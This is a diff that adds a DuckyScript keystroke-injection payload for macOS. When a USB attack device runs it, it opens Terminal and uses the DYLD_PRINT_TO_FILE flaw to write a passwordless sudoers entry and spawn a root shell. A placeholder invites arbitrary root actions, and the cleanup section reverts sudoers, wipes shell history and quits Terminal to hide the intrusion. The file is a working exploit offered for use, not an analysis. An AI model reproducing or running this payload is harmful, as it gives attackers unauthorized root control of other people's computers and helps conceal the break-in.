@@ -1,0 +1,51 @@
+REM Author: V3sth4cks153
+REM Title: DYLD_PRINT_TO_FILE Privilege Escalation + cleanup
+REM This payload exploits the DYLD_PRINT_TO_FILE Privilege Escalation in order to get root on a Mac.
+REM This is just the privilege escalation and the cleanup parts. You can put anything you want root to do in between.
+REM The cleanup part resets the sudoers file, clears the command history and then quits the Terminal app.
+REM
+REM ********************* USE THIS AT YOUR OWN RISK *********************
+REM
+REM --------------- OPEN TERMINAL ---------------
+GUI SPACE
+DELAY 100
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 1000
+REM --------------- GO TO HOME DIRECTORY ---------------
+STRING cd
+ENTER
+DELAY 100
+REM --------------- ESCALATE PRIVS ---------------
+STRING echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
+ENTER 
+REM *                                                                                       *
+REM ********************* YOU CAN PUT ANYTHING YOU WANT ROOT TO DO HERE *********************
+REM *                                                                                       *
+REM --------------- CLEANUP ---------------
+STRING cd
+ENTER
+STRING visudo -f /etc/sudoers
+ENTER
+DOWNARROW
+REPEAT 50
+RIGHTARROW
+REPEAT 40
+STRING i
+RIGHTARROW
+BACKSPACE
+REPEAT 35
+ESC
+STRING :w
+ENTER
+STRING :x
+ENTER
+STRING history -c
+ENTER
+DELAY 100
+STRING exit
+ENTER
+STRING history -c
+ENTER
+GUI q
